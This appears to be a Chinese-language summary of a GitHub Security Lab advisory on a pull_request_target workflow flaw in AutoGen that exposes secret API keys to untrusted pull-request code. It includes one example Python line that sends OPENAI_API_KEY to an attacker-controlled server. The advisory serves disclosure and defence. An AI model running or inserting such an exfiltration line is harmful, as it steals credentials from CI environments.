# GHSL-2024-025_GHSL-2024-026：AutoGen中的潜在秘密泄露

## 问题概述

在GitHub工作流程中，当触发Pull Request时，可能会泄露秘密API密钥（如OpenAI、Azure、Bing等）。

### 关键概念：AutoGen

- **版本**：v0.2.15
- **漏洞类型**：Pull Request中的恶意代码可获取环境变量中的秘密（如API密钥）。

## 技术细节

### 触发事件

1. **pull_request_target**：此事件显式检查出不可信的代码并运行它。
2. 这意味着，攻击者可以在Pull Request中提交恶意代码，该代码能在访问机密信息的环境中执行。

### 示例

攻击者可以创建一个Pull Request，包含如下恶意脚本：
```python
urllib.request.urlopen(f"https://YOUR-CONTROLLED-SERVER?{os.environ['OPENAI_API_KEY']}")
```
该脚本会访问存储在环境变量中的API密钥，如`OPENAI_API_KEY`、`AZURE_OPENAI_API_KEY`。

### 漏洞检测

- 漏洞是通过一个名为“Checkout of untrusted code in trusted context”的CodeQL查询发现的。
- 工作流程虽然在运行时没有写权限，不能修改主库，但攻击者仍可以获取到可用的秘密。

### 其他影响

除了`RetrieveChatTest.Coverage`步骤，还有其他步骤也存在相同的风险。

## 解决方案

要防止这种漏洞，建议在处理Pull Request时，不要允许不可信代码访问机密信息。

## 联系方式

- 如果有任何与GHSL-2024-025或GHSL-2024-026相关的问题，可以联系GHSL团队，邮箱：[securitylab@github.com](mailto:securitylab@github.com)。
- 请在沟通中引用相关漏洞编号。